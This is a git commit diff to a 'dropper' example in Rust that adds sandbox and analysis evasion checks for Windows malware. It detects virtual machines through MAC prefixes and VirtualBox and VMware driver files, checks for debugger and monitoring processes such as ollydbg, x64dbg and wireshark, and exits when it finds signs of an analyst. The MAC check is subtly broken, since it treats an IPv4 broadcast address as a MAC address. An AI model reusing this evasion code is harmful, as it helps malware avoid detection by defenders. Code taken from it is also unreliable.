3d561c9ae6c8599463132bb800290e6285fa8e31
KmLerZ <110494974+KmLerZ@users.noreply.github.com>
2025-01-19 22:31:44 +0100

    Update checks.rs
    ✨ Add checks

--- examples/dropper/src/checks/checks.rs
+++ examples/dropper/src/checks/checks.rs
@@ -1,13 +1,11 @@
 use winapi::um::winnt::OSVERSIONINFOEXW;
 use std::fs;
-use std::io::Read;
 use std::mem::zeroed;
 use std::net::ToSocketAddrs;
-use std::time::{SystemTime, UNIX_EPOCH};
 use std::process::Command;
 use std::{thread, time};
-use sysinfo::{System, SystemExt, ComponentExt, ProcessExt};
-// use pnet::datalink;
+use sysinfo::{System, SystemExt, ProcessExt};
+use get_if_addrs::{get_if_addrs};
 
 extern "system" {
     fn RtlGetVersion(lpVersionInformation: *mut OSVERSIONINFOEXW) -> i32;
@@ -19,63 +17,69 @@ pub fn perform_checks() -> bool {
 
     // Check OS version
     if os_info.dwMajorVersion != 10 {
-        println!("Version ❌");
+        println!("Version [X]");
+        thread::sleep(time::Duration::from_secs(5));
         return false;
     } else {
-        println!("Version ✔️");
+        println!("Version [✓]");
     }
 
     // Check internet connectivity
     if check_internet() {
-        println!("Internet ✔️");
+        println!("Internet [✓]");
     } else {
-        println!("Internet ❌");
+        println!("Internet [X]");
+        thread::sleep(time::Duration::from_secs(5));
         return false;
     }
 
     // Check if machine is VM or container
     if check_virtual_machine() {
-        println!("VM/Container ✔️");
+        println!("VM/Container [✓]");
     } else {
-        println!("VM or Container detected ❌");
+        println!("VM or Container detected [X]");
+        thread::sleep(time::Duration::from_secs(5));
         return false;
     }
 
     // Check user activity
     if check_user_activity() {
-        println!("User activity detected ✔️");
+        println!("User activity detected [✓]");
     } else {
-        println!("No user activity ❌");
+        println!("No user activity [X]");
+        thread::sleep(time::Duration::from_secs(5));
         return false;
     }
 
-        // Check MAC addresses for VM patterns
-    // if check_mac_addresses() {
-    //     println!("MAC address indicates a VM ❌");
-    //     return false;
-    // } else {
-    //     println!("MAC address does not indicate a VM ✔️");
-    // }
+    // Check VM-specific files
+    if check_vm_files() {
+        println!("No VM files detected [✓]");
+    } else {
+        println!("VM files detected [X]");
+        thread::sleep(time::Duration::from_secs(5));
+        return false;
+    }
+    
 
-    // Check CPU temperature
-    // if check_cpu_temperature() {
-    //     println!("CPU temperature detected ✔️");
-    // } else {
-    //     println!("No CPU temperature detected, likely a virtual machine ❌");
-    //     return false;
-    // }
+    // Check MAC addresses for VM patterns
+    if check_mac_addresses() {
+        println!("MAC address indicates a VM [X]");
+        thread::sleep(time::Duration::from_secs(5));
+        return false;
+    } else {
+        println!("MAC address does not indicate a VM [✓]");
+    }
 
     // Check for suspicious processes
     if check_suspicious_processes() {
-        println!("Suspicious processes detected ❌");
+        println!("Suspicious processes detected [X]");
+        thread::sleep(time::Duration::from_secs(5));
         return false;
     } else {
-        println!("No suspicious processes detected ✔️");
+        println!("No suspicious processes detected [✓]");
     }
-
     true
 }
-
 
 
 
@@ -120,13 +124,13 @@ fn check_virtual_machine() -> bool {
 }
 
 fn check_user_activity() -> bool {
-    let default_profiles = vec!["Default", "Public", "Default User", "All Users"];
+    let default_profiles = vec!["Default", "Public", "Default User", "All Users"]; // Default Windows profiles
     if let Ok(entries) = fs::read_dir("C:\\Users") {
         for entry in entries {
             if let Ok(entry) = entry {
                 let folder_name = entry.file_name().into_string().unwrap_or_default();
-                if !default_profiles.contains(&folder_name.as_str()) {
-                    return true;
+            if !default_profiles.contains(&folder_name.as_str()) {
+                return true;
                 }
             }
         }
@@ -154,41 +158,35 @@ fn sleep_test() -> bool {
 }
 
 // Check if the MAC address indicates a VM
-// fn check_mac_addresses() -> bool {
-//     let vm_mac_prefixes = vec![
-//         "08:00:27", // VirtualBox
-//         "00:0C:29", "00:1C:14", "00:50:56", "00:05:69", // VMware
-//     ];
-//     for iface in datalink::interfaces() {
-//         if let Some(mac) = iface.mac {
-//             let mac_str = mac.to_string().to_uppercase();
-//             for prefix in &vm_mac_prefixes {
-//                 if mac_str.starts_with(prefix) {
-//                     println!("Detected VM MAC address: {}", mac_str);
-//                     return true;
-//                 }
-//             }
-//         }
-//     }
-//     false
-// }
+fn check_mac_addresses() -> bool {
+    let vm_mac_prefixes = vec![
+        "08:00:27", // VirtualBox
+        "00:0C:29", "00:1C:14", "00:50:56", "00:05:69", // VMware
+    ];
 
-// Check the CPU temperature if not available is a VM
-// fn check_cpu_temperature() -> bool {
-//     let mut system = System::new_all();
-//     system.refresh_all();
-//     for component in system.components() {
-//         if let Some(temp) = component.temperature() {
-//             println!("CPU Temperature: {}°C", temp);
-//             return true;
-//         }
-//     }
-//     false
-// }
+    if let Ok(ifaces) = get_if_addrs() {
+        for iface in ifaces {
+            if let get_if_addrs::IfAddr::V4(addr) = iface.addr {
+                let mac_option = addr.broadcast; // Get the MAC address
+            if let Some(mac) = mac_option {
+                let mac_str = mac.to_string().to_uppercase();
+            for prefix in &vm_mac_prefixes {
+                if mac_str.starts_with(prefix) {
+                    println!("Detected VM MAC address: {}", mac_str);
+                    return true;
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    false
+}
 
 // Check for non needed processes
 fn check_suspicious_processes() -> bool {
-    let suspicious_processes = vec!["ollydbg.exe", "wireshark.exe", "procmon.exe", "ida.exe", "x64dbg.exe"];
+    let suspicious_processes = vec!["ollydbg.exe", "wireshark.exe", "procmon.exe", "ida.exe", "x64dbg.exe"]; // process names to check for
     let mut system = System::new_all();
     system.refresh_processes();
     for (_pid, process) in system.processes() {
@@ -199,4 +197,37 @@ fn check_suspicious_processes() -> bool {
         }
     }
     false
+}
+
+fn check_vm_files() -> bool {
+    let vm_files = vec![
+        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\agent.pyw",
+        "C:\\WINDOWS\\system32\\drivers\\vmmouse.sys",
+        "C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys",
+        "C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys",
+        "C:\\WINDOWS\\system32\\drivers\\VBoxGuest.sys",
+        "C:\\WINDOWS\\system32\\drivers\\VBoxSF.sys",
+        "C:\\WINDOWS\\system32\\drivers\\VBoxVideo.sys",
+        "C:\\WINDOWS\\system32\\vboxdisp.dll",
+        "C:\\WINDOWS\\system32\\vboxhook.dll",
+        "C:\\WINDOWS\\system32\\vboxmrxnp.dll",
+        "C:\\WINDOWS\\system32\\vboxogl.dll",
+        "C:\\WINDOWS\\system32\\vboxoglarrayspu.dll",
+        "C:\\WINDOWS\\system32\\vboxoglcrutil.dll",
+        "C:\\WINDOWS\\system32\\vboxoglerrorspu.dll",
+        "C:\\WINDOWS\\system32\\vboxoglfeedbackspu.dll",
+        "C:\\WINDOWS\\system32\\vboxoglpassthroughspu.dll",
+        "C:\\WINDOWS\\system32\\vboxservice.exe",
+        "C:\\WINDOWS\\system32\\vboxtray.exe",
+        "C:\\WINDOWS\\system32\\VBoxControl.exe",
+    ];
+
+    for file_path in vm_files {
+        if fs::metadata(file_path).is_ok() {
+            println!("Detected VM file: {}", file_path);
+            return false;
+        }
+    }
+
+    true
 }
